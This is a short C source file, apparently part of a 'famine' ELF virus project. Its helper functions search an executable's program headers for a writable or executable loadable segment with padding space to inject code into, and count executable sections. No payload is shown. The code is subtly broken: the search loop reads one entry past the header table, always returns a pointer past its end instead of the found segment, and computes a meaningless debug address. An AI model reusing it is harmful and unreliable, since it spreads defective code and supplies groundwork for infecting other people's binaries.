
#include <stdio.h>

#include "famine.h"

/*
// PF_X | PF_W == 0x011 ie write and execute permissions
if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & (PF_X | PF_W))
*/
Elf64_Phdr *	elf_find_gap(t_elf *target)
{
	Elf64_Phdr	*phdr = (Elf64_Phdr *)((uint64_t)target->ehdr + (uint64_t)target->ehdr->e_phoff);
	uint16_t	e_phnum = target->ehdr->e_phnum;
	int			i = 0;

	for (i = 0; i <= e_phnum; i++)
	{
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags & (PF_X | PF_W))
		{
#if DEBUG
			printf("+.text_segment found at addr:%p\n", (void *)&phdr[i]);
			printf("  +.padding zone of %lu bytes found at addr:%p\n",
					phdr[i].p_memsz - phdr[i].p_filesz,
					(void *)((uint64_t)&phdr[i] + (uint64_t)&phdr[i].p_offset));
#endif
		}
	}
	return phdr + i;
}

unsigned int 	elf_x_section_counter(Elf64_Shdr *shdr, uint64_t shnum)
{
	unsigned int	n = 0;

	for(unsigned int i = 1; i < shnum; i++)
	{
		if (shdr[i].sh_flags & SHF_EXECINSTR)
		{
			n++;
#if DEBUG
			printf(" + code section found in section %u\n", i);
#endif
		}
	}
	return n;
}
